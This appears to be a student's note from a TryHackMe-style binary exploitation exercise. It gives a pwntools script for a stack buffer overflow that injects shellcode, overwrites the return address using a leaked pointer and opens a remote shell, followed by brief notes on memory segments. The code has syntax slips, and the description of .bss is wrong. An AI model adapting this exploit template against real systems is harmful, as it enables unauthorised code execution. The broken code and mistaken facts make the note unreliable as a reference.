Tags: [[Binary Exploit]] 

When running file on the binary 
ELF 64 bit

Shell code is added when nx is disabled and we can execute shell code from stack or heap

The program doesn't include `bin.sh` that's why we add shell code in the pen script

```python
from pwn import *

context.binary="./bin4.pwn4"
P.remote(url,port)

Shellcode=b"...."
Out=p.recv()

Pointer = int(out.split(b'a')[1].strip().decode('utf-8'),16)

Payload=shellcode+b'A'*(0x58 - len(shellcode))+p64(pointer)

p.sendline(payload)
P interactive()
```
P64 and p32 only takes int that's why decode it from hexadecimal to int. 

0x58 ( is mentioned at the top of the function in graph view in cutter ) is where get function starts to take input 
### Payload 

Heap is
- hierarchical, also larger 
- slower than stack 
- Can be stored and retrieved in any order

Data has 2 parts 
- `.data` - hold variable 
- `.bss` - hold unsigned variables (buffer)

Text - main instructions loaded into, this segment to be fetched by CPU

```
| Retn | <- high address
|   |  |
|   ^  | <- stack
|   |  |
| Heap |
| Data |
| Text | <- low address 
|______|
```

Stack upr se neeche assign karega address aur neeche se uper fill karega 

Use `context.log_level="debug"` to do detailed analysis of the binary 
### References
4-THM


